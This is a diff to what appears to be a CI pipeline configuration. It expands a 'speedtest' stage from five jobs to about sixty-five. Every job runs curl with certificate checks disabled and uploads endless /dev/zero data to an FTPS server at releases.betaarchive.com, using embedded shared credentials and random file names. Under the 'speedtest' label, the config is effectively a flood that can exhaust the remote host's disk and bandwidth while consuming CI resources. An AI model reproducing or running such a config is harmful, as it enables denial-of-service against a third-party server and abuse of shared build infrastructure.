@@ -1,9 +1,70 @@
 jobs:
   include:
     - stage: speedtest
-      script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero7.tar.gz
-    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero8.tar.gz
-    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero9.tar.gz
-    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero10.tar.gz
-    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero11.tar.gz
-      
+      script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero$RANDOM.tar.gz
+    
